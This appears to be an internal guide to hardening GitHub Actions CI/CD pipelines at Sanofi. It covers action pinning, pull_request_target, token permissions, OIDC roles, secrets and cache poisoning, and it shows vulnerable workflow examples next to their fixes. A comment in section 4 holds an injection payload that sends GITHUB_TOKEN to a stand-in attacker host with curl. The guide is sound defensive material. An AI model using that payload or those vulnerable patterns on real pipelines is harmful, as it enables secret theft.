# GitHub Actions Security Hardening

Deep-dive into GitHub Actions security risks, attack vectors, and mitigations
relevant to Sanofi CI/CD pipelines.

## Table of Contents

- [1. Supply Chain Attacks via Compromised Actions](#1-supply-chain-attacks-via-compromised-actions)
- [2. Secrets Extraction via `pull_request_target`](#2-secrets-extraction-via-pull_request_target)
- [3. GITHUB_TOKEN Permission Escalation](#3-github_token-permission-escalation)
- [4. Workflow Injection via Untrusted Input](#4-workflow-injection-via-untrusted-input)
- [5. Self-Hosted Runner Risks](#5-self-hosted-runner-risks)
- [6. OIDC for AWS: Role-Per-Environment Pattern](#6-oidc-for-aws-role-per-environment-pattern)
- [7. JFrog Credentials via .terraformrc](#7-jfrog-credentials-via-terraformrc)
- [8. Environment-Scoped Secrets vs `secrets: inherit`](#8-environment-scoped-secrets-vs-secrets-inherit)
- [9. `continue-on-error: true` Risks on Security Steps](#9-continue-on-error-true-risks-on-security-steps)
- [10. OpenSSF Scorecard Checks](#10-openssf-scorecard-checks)
- [11. Artifact Attestations and Provenance](#11-artifact-attestations-and-provenance)
- [12. Cache Poisoning and `cache-mode`](#12-cache-poisoning-and-cache-mode)
- [Sources](#sources)

---

## 1. Supply Chain Attacks via Compromised Actions

**Risk**: A third-party action is compromised (maintainer account takeover, malicious
update). If you reference it by mutable tag (`@v4`), the next run uses the compromised
code with full access to your secrets and GITHUB_TOKEN.

**Attack scenario:**

```yaml
# Vulnerable: tag @v2 can be moved to point at malicious commit
- uses: popular-org/useful-action@v2
```

An attacker compromises the action maintainer's account, rewrites the `v2` tag to
point at a malicious commit that exfiltrates `GITHUB_TOKEN` and environment secrets.

**Mitigation: SHA pinning (within the limits of the allowlist)**

```yaml
# Safe: immutable reference to a specific commit
- uses: popular-org/useful-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 # v2.3.1
```

**Sanofi allowlist constraint.** Sanofi's GitHub Actions allowlist governs which
actions can run at all. GitHub-published actions (`actions/*`) and actions from
verified creators are allowed broadly and SHOULD be SHA-pinned as above. Other
third-party actions are listed individually, and the allowlist entries are
tag-based, not SHA-based — so pinning a non-listed action to a commit SHA will
still be rejected at runtime. For those actions, use the exact reference
registered in the allowlist (typically a tag such as `@v2`), and ask the platform
team to update the allowlist if you need a new action or a newer version.

**Exception — org-managed reusable workflows:** Sanofi org-level reusable workflows
(e.g., CodeGuard `cyber-AST-Action_reusable`) may be referenced with
`@main` instead of a pinned SHA. These workflows are centrally maintained by the
security/platform team within the Sanofi GitHub org, so they are not subject to
third-party supply-chain risk. The owning team controls the `main` branch and reviews
all changes before merge. When using `@main` for org workflows, always add a comment
explaining the exception.

**Additional mitigations:**

- Keep the action allowlist as the authoritative gate on what runs
- Use Dependabot or Renovate to propose SHA updates for allowlisted GitHub /
  verified-creator actions (review required)
- Prefer GitHub-owned actions (`actions/*`) which have higher trust
- Review action source code before requesting allowlist addition
- Use `CODEOWNERS` to require review for `.github/workflows/` changes
- Org owners MAY enable the "Require actions to be pinned to a full-length commit SHA" policy and block known-bad versions with a `!` prefix in the allowed-actions list; an unpinned `uses:` then fails the run. Tag-based allowlist entries conflict with that policy, so ask the platform team which applies before pinning or unpinning.

**Finding the SHA for an action tag:**

```bash
gh api repos/OWNER/REPO/commits/refs/tags/TAG --jq .sha
```

The `commits/refs/tags/` endpoint dereferences annotated tags. `git/ref/tags/TAG` returns the tag object SHA for annotated tags (`.object.type` is `tag`), which is not a commit and MUST NOT be pinned. Example: `aws-actions/configure-aws-credentials` `v4.0.2` returns tag object `5579c002…` from `git/ref`, but its commit is `e3dd6a42…`.

**Keep SHA pins current with Dependabot.** A pin without an updater rots:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

- Dependabot rewrites the SHA and the trailing `# vX.Y.Z` comment; keep that comment format.
- Dependabot alerts fire only for actions that use semantic-version tags, NEVER for SHA-pinned ones. Version updates are the control for pinned actions.
- It also updates reusable workflow references.
- Dependabot version updates apply a default 3-day cooldown to new releases; security updates are exempt.

---

## 2. Secrets Extraction via `pull_request_target`

**Risk**: `pull_request_target` runs in the context of the base branch (with access
to secrets), but can be triggered by an external contributor's fork PR. If the workflow
checks out the PR's head code and executes it, the attacker's code runs with your secrets.

**Dangerous pattern:**

```yaml
on:
  pull_request_target:

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      # DANGEROUS: checks out attacker-controlled code
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # Attacker's code now runs with access to secrets
      - run: npm ci && npm test
```

**Mitigation:**

1. Avoid `pull_request_target` entirely when possible -- use `pull_request` instead
2. If you must use it, NEVER checkout the PR head code
3. If you need the PR code, use a two-workflow pattern:
   - First workflow (`pull_request`): build and test (no secrets needed)
   - Second workflow (`workflow_run`): post results using secrets

**Safe alternative:**

```yaml
on:
  pull_request: # Runs in fork context, no secrets access

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test
```

**Platform changes that affect these workflows:**

- Since 2025-12-08, `pull_request_target` always takes the workflow file and `GITHUB_REF`/`GITHUB_SHA` from the default branch, whatever the PR's base. Fixing the default branch fixes the vulnerability; outdated branches no longer run.
- Environment branch rules now evaluate the executing ref: `refs/pull/N/merge` for `pull_request`, `pull_request_review`, and `pull_request_review_comment`; the default branch for `pull_request_target`. A rule matching only the head branch stops matching.
- Workflow execution protections (GA 2026-09-17) add actor/event allowlists. For public repositories GitHub's default rule disables `pull_request_target`, enforced from 2026-11-02 where the default policy was in use. Internal and private repositories are unaffected.
- `workflow_run` is privileged too: treat artifacts from the triggering run as untrusted input and NEVER execute them.
- Enable CodeQL analysis of the `actions` language to catch these patterns.

---

## 3. GITHUB_TOKEN Permission Escalation

**Risk**: By default, `GITHUB_TOKEN` may have broad write permissions (depending on
org settings). Workflows that don't restrict permissions can be exploited to modify
repo contents, approve PRs, or push to protected branches.

**Vulnerable (no permissions block):**

```yaml
name: CI
on: push
# No permissions block -- inherits org default (may be write-all)
jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm test
```

**Mitigation: Explicit least-privilege permissions**

```yaml
name: CI
on: push

permissions:
  contents: read # Only what's needed

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm test
```

**Permission escalation patterns to watch for:**

- `permissions: write-all` -- grants everything
- Missing `permissions` block -- relies on org defaults
- `contents: write` on jobs that only need read
- `pull-requests: write` on CI-only workflows
- Reusable workflow callers inheriting parent permissions without narrowing

**Org-level defense:** Set default GITHUB_TOKEN permissions to `read` in org settings.

---

## 4. Workflow Injection via Untrusted Input

**Risk**: GitHub Actions expressions (`${{ }}`) in `run:` blocks are interpolated
before the shell executes. If the expression contains attacker-controlled input (PR
title, branch name, issue body), it enables command injection.

**Vulnerable:**

```yaml
- name: Echo PR title
  run: echo "Processing PR ${{ github.event.pull_request.title }}"
  # If PR title is: "; curl attacker.com/steal?token=$GITHUB_TOKEN"
  # The shell executes: echo "Processing PR "; curl attacker.com/steal?...
```

**Dangerous expressions (attacker-controlled):**

- `${{ github.event.pull_request.title }}`
- `${{ github.event.pull_request.body }}`
- `${{ github.event.issue.title }}`
- `${{ github.event.issue.body }}`
- `${{ github.event.comment.body }}`
- `${{ github.event.pull_request.head.ref }}` (branch name)
- `${{ github.head_ref }}`

**Mitigation: Use environment variables instead of inline expressions**

```yaml
- name: Echo PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR $PR_TITLE"
  # Now $PR_TITLE is treated as a shell variable, not interpolated
```

**Mitigation: Use an intermediate step with output**

```yaml
- name: Sanitize input
  id: sanitize
  run: |
    SAFE_TITLE=$(echo "$PR_TITLE" | tr -cd '[:alnum:] [:space:]-_')
    echo "title=$SAFE_TITLE" >> $GITHUB_OUTPUT
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

---

## 5. Self-Hosted Runner Risks

**Risk**: Self-hosted runners persist between jobs. A malicious workflow can install
backdoors, modify tools, or steal credentials that persist for subsequent jobs.

**Key risks:**

- Credential theft from previous jobs (AWS creds, tokens in `/tmp`)
- Tool tampering (replacing `git`, `npm`, `terraform` with trojanized versions)
- Persistence via cron jobs or startup scripts
- Lateral movement to internal networks

**Mitigations:**

- Use ephemeral runners (destroy after each job) whenever possible
- Never run untrusted fork PRs on self-hosted runners
- Isolate runners in dedicated VPCs with minimal network access
- Use runner groups to restrict which repos can use which runners
- Audit runner machines regularly

At Sanofi, all jobs MUST use the managed ARC runner `atmos-aws-arc-runner-set`.
GitHub-hosted runners (`ubuntu-latest`) are not permitted. The ARC runner set provides
ephemeral, pre-hardened runners managed by the platform team.

**Runner fleet obligations (github.com).**

- Runner `2.329.0` is only the minimum to register or re-register. A runner MUST install each new release within 30 days, and job queuing pauses on a critical security update. Full enforcement for GitHub Enterprise Cloud began 2026-09-29.
- ARC owners: check `GET /actions/runners/deprecations/{version}` (repository, organization, or enterprise) for `registration_deprecates_at` and `runtime_deprecates_at`. Rebuild runner images from current releases rather than cached templates. Actions Runner Controller 0.15.0 (2026-10-01) updates patch versions in place.
- "Ephemeral" is not a secret boundary by itself. A runner can run more than one job, and secrets passed as command-line arguments are visible to other processes on the host. Prefer just-in-time (JIT) runners, one job each, and keep secrets out of argv.

---

## 6. OIDC for AWS: Role-Per-Environment Pattern

**Pattern**: Use GitHub's OIDC provider to assume AWS IAM roles without storing
long-lived credentials. Each environment (dev, test, prod) has its own IAM role
whose trust policy pins the repository and the environment. An environment `sub`
does not restrict branches; add deployment branch/tag rules on the environment.

```yaml
permissions:
  id-token: write # Required for OIDC token request
  contents: read

jobs:
  deploy:
    environment: ${{ inputs.env }}
    runs-on: atmos-aws-arc-runner-set
    steps:
      - name: Configure AWS Credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/App_githubrunners_accelerator_${{ inputs.env }}
          aws-region: eu-west-1
```

**Select the repository's actual `sub` format first.** GitHub's default format changed:
repositories created after 2026-07-15, repositories renamed or transferred after that
date, and repositories (or orgs) that opted in use immutable owner/repository IDs.
Copying the name-only condition fails role assumption for those repositories. Source:
<https://docs.github.com/en/actions/reference/security/oidc#immutable-subject-claims>.

| Format | Environment `sub` |
| --- | --- |
| Name-based (older repos) | `repo:OWNER/REPO:environment:ENV` |
| Immutable | `repo:OWNER@OWNER_ID/REPO@REPO_ID:environment:ENV` |

```bash
# IDs for the immutable format
gh api repos/OWNER/REPO --jq '{owner_id: .owner.id, repo_id: .id}'
# Repository OIDC customization (use_immutable_subject, include_claim_keys)
gh api repos/OWNER/REPO/actions/oidc/customization/sub
```

Confirm the exact `sub` with the platform team or an `AssumeRoleWithWebIdentity` CloudTrail event before writing the condition. Use an exact `StringEquals` match.

Trust-policy rules:

- Define at least one `sub` condition. A policy with only `aud` lets any repository request the role.
- NEVER widen to `repo:OWNER/REPO:*`. It admits every branch, pull request, and environment.
- GitHub states that custom claims, including `job_workflow_ref`, are unavailable in AWS trust policies. A shared role cannot be limited to one reusable workflow from the AWS side; scope by environment and deployment rules instead.
- The environment `sub` form applies only when the job sets `environment:`. Without it, `sub` ends in `:ref:refs/heads/BRANCH` or `:pull_request`.
- OIDC tokens for Dependabot update jobs carry `event_name: dynamic`. Only workflows you expect should reach a deploy role.

**IAM trust policy (per environment; immutable-format example):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:Sanofi-Accelerator@OWNER_ID/my-repo@REPO_ID:environment:prod"
        }
      }
    }
  ]
}
```

**Key points:**

- `sub` pins the specific repo AND environment; use the format the repo actually emits
- Prod role can only be assumed by jobs in the `prod` environment, which has approval gates and a `main`-only deployment branch rule
- AWS account ID stored as a GitHub secret, not hardcoded
- Region typically `eu-west-1` for Sanofi EMEA workloads

---

## 7. JFrog Credentials via .terraformrc

For Terraform workflows that pull private modules from Sanofi's JFrog Artifactory:

```yaml
- name: Configure JFrog Credentials
  run: |
    cat <<EOF > ~/.terraformrc
    credentials "sanofi.jfrog.io" {
      token = "${{ secrets.JFROG_TOKEN }}"
    }
    EOF
```

**Security considerations:**

- `JFROG_TOKEN` MUST be a GitHub Environment secret (not repo-level), so every job running `terraform init` sets `environment:` (including validation jobs)
- The credentials file lives only on the runner; `hashicorp/setup-terraform` writes it from `cli_config_credentials_hostname` and `cli_config_credentials_token`
- Never commit `.terraformrc` to the repository
- Scope the JFrog token to read-only access for CI (write only for publish jobs)
- Rotate the token regularly

---

## 8. Environment-Scoped Secrets vs `secrets: inherit`

**`secrets: inherit`**: Passes ALL available secrets to a reusable workflow. This is
convenient but violates the principle of least privilege.

**When `secrets: inherit` is acceptable:**

- Calling org-level reusable workflows (CodeGuard) that need specific org secrets
- The reusable workflow is owned by a trusted team within the org

**When to scope secrets explicitly:**

```yaml
# Preferred: callee declares on.workflow_call.secrets; caller passes by name
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/deploy.yaml
    with:
      environment: prod
    secrets:
      AWS_ACCOUNT_ID: ${{ secrets.AWS_ACCOUNT_ID }}
      # Only pass what the workflow needs
```

The caller job cannot use `environment:`; the called job sets it and receives the environment secret. A secret the caller does not pass resolves to an empty string unless the callee declares it `required: true`. A reusable workflow cannot elevate the caller's `permissions`.

Reusable workflow limits: 10 levels of nesting and 50 unique called workflows per top-level workflow file (raised from 4 and 20 in 2025-11). Workflow-level `env` does not propagate across the call boundary; pass values with `with:` or outputs. A reusable workflow is called at job level, so `GITHUB_ENV` cannot hand values to the caller's steps. Inside a called workflow, `job.workflow_ref`, `job.workflow_sha`, `job.workflow_repository`, and `job.workflow_file_path` identify the reusable workflow itself (github.com only, since 2026-09).

**Risk of `secrets: inherit`:**

- A reusable workflow update could start reading secrets it previously didn't
- Violates least-privilege secret management if environment scoping is not in place
- Makes it harder to audit which secrets are used where

---

## 9. `continue-on-error: true` Risks on Security Steps

**Risk**: Setting `continue-on-error: true` on security-related steps (SAST, audit,
vulnerability scanning) silently swallows failures. The workflow reports success even
when security checks find critical issues.

**Dangerous:**

```yaml
- name: SAST Scan
  run: npm run sast
  continue-on-error: true # Critical findings are silently ignored

- name: Dependency Audit
  run: npm audit --audit-level=high
  continue-on-error: true # High-severity vulnerabilities pass through
```

**When `continue-on-error` is acceptable:**

- Non-blocking informational steps (e.g., uploading optional metrics)
- Steps that generate warnings but not blocking findings
- NEVER on security, SAST, audit, or compliance steps

**Mitigation:**

```yaml
- name: SAST Scan
  run: npm run sast
  # No continue-on-error -- if SAST fails, the build fails
```

---

## 10. OpenSSF Scorecard Checks

The OpenSSF Scorecard assesses repository security practices. Key checks relevant
to GitHub Actions security:

| Check               | What It Verifies                                  |
| ------------------- | ------------------------------------------------- |
| Token-Permissions   | Workflow permissions are scoped                   |
| Pinned-Dependencies | Actions pinned to SHA                             |
| Dangerous-Workflow  | No `pull_request_target` with checkout of PR head |
| Branch-Protection   | Branch protection rules configured                |
| Code-Review         | PRs require review before merge                   |
| SAST                | Static analysis configured                        |
| Vulnerabilities     | Known vulnerabilities in dependencies             |

**Running Scorecard in CI:**

```yaml
- name: OSSF Scorecard
  uses: ossf/scorecard-action@2d1146689b8cda280b9bc96326124645441f03bc # v2.4.4
  with:
    results_file: results.sarif
    results_format: sarif
```

Scorecard results can be uploaded to GitHub Security tab via SARIF.

---

## 11. Artifact Attestations and Provenance

Artifact attestations give signed SLSA build-provenance (and SBOM) statements for a built artifact, signed with short-lived Sigstore certificates. They implement the "SLSA provenance" recommendation in [cicd-rules.md §3.5](cicd-rules.md#35-sign-and-verify-release-artifacts-recommended).

Prerequisites to confirm before adding the step:

- Attestations in private or internal repositories need GitHub Enterprise Cloud; GitHub Enterprise Server is unsupported.
- `actions/attest` MUST be on the Sanofi allowlist ([pins](pipeline-templates.md#action-pins)). `actions/attest-build-provenance` v4 is a wrapper around it; use `actions/attest` directly.
- The job needs `id-token: write`, `contents: read`, and `attestations: write`. Add `packages: write` for an image pushed to GHCR, and `artifact-metadata: write` to create storage records on the linked-artifacts page.

```yaml
- name: Attest image provenance
  uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
  with:
    subject-name: ${{ steps.login-ecr.outputs.registry }}/${{ inputs.ecr-repository }} # no tag
    subject-digest: ${{ steps.build.outputs.digest }}
    push-to-registry: true # needs a registry login earlier in the job
```

Binary or file: replace the last three inputs with `subject-path: PATH`. SBOM attestation: add `sbom-path` (SPDX or CycloneDX JSON).

Verify before promotion (`oci://` prefix for images; a registry login is required first):

```bash
gh attestation verify oci://REGISTRY/REPO@sha256:DIGEST -R OWNER/REPO
gh attestation verify ARTIFACT -R OWNER/REPO --predicate-type https://spdx.dev/Document/v2.3
```

- `subject-name` MUST be the fully qualified image name WITHOUT a tag; `subject-digest` MUST be `sha256:HEX`.
- Verification trusts the signer workflow identity. Pass `--signer-workflow` or `--cert-identity` for stricter checks when the build runs in a reusable workflow.
- Whether the Sanofi registries (ECR, JFrog) accept pushed attestation referrers is NOT verified here; confirm with the platform team, else keep attestations in GitHub's store and verify by digest.
- Delete obsolete attestations ([lifecycle](https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/manage-attestations)).

---

## 12. Cache Poisoning and `cache-mode`

**Risk**: a workflow an outsider can influence (`pull_request_target`, `issue_comment`, fork `workflow_run`) writes a poisoned entry into the default-branch cache; a trusted `push` or `schedule` workflow restores it and runs attacker content with secrets.

Since 2026-06-26 GitHub issues read-only cache tokens to untrusted triggers that run in the default-branch scope. `cache-mode` (GA 2026-09-10, github.com) sets access per workflow or job, and the job value wins:

| Value | Restore | Save |
| --- | --- | --- |
| `read` | yes | no |
| `write` | yes | yes |
| `write-only` | no | yes |
| `none` | no | no |

```yaml
permissions:
  contents: read
cache-mode: read # workflow default; build jobs that must save say `cache-mode: write`
```

- NEVER declare `write` or `write-only` on a low-trust trigger: it removes the secure default and GitHub only annotates a warning.
- Let a `push` workflow own cache saves; untrusted triggers restore.
- A called reusable workflow cannot receive more cache access than its caller.
- A denied cache operation logs a message and the job continues, so a cache miss is the symptom, not a failure.
- `actionlint` v1.7.12 rejects `cache-mode`; ignore that finding (see [SKILL.md](../SKILL.md#failure-modes)).

---

## Sources

- Secure use reference: <https://docs.github.com/en/actions/reference/security/secure-use>
- Actions policy: blocking and SHA pinning (2025-08-15): <https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/>
- Keeping actions up to date with Dependabot: <https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/auto-update-actions>
- Dependabot options reference (`cooldown`): <https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-options-reference>
- `pull_request_target` and environment branch protection changes (2025-11-07): <https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/>
- Workflow execution protections GA (2026-09-17): <https://github.blog/changelog/2026-09-17-workflow-execution-protections-in-github-actions-generally-available/>
- Securely using `pull_request_target`: <https://docs.github.com/actions/reference/security/securely-using-pull_request_target>
- Self-hosted runner minimum version enforcement (2026-06-12): <https://github.blog/changelog/2026-06-12-github-actions-minimum-version-enforcement-timeline-for-self-hosted-runners/>
- Enforcement date moved to 2026-09-29: <https://github.blog/changelog/2026-09-28-self-hosted-runner-version-enforcement-date-has-moved/>
- Early September 2026 updates (runner deprecation API, `job` context): <https://github.blog/changelog/2026-09-03-github-actions-early-september-2026-updates/>
- Actions Runner Controller 0.15.0: <https://github.blog/changelog/2026-10-01-actions-runner-controller-release-0-15-0/>
- Configuring OIDC in AWS: <https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-in-aws>
- OIDC reference (immutable `sub`, claims): <https://docs.github.com/en/actions/reference/security/oidc>
- OIDC with reusable workflows: <https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-with-reusable-workflows>
- Reusing workflow configurations (limits): <https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations>
- Increased limits for reusable workflows (2025-11-06): <https://github.blog/changelog/2025-11-06-new-releases-for-github-actions-november-2025/>
- Using artifact attestations: <https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations>
- `actions/attest` repository: <https://github.com/actions/attest>
- Control cache access with `cache-mode` (2026-09-10): <https://github.blog/changelog/2026-09-10-control-github-actions-cache-access-with-cache-mode/>
- Read-only cache for untrusted triggers (2026-06-26): <https://github.blog/changelog/2026-06-26-read-only-actions-cache-for-untrusted-triggers/>
- Workflow syntax `cache-mode`: <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#cache-mode>
- CodeQL workflow security analysis GA (2025-04-22): <https://github.blog/changelog/2025-04-22-github-actions-workflow-security-analysis-with-codeql-is-now-generally-available/>
- actionlint changelog: <https://github.com/rhysd/actionlint/blob/main/CHANGELOG.md>
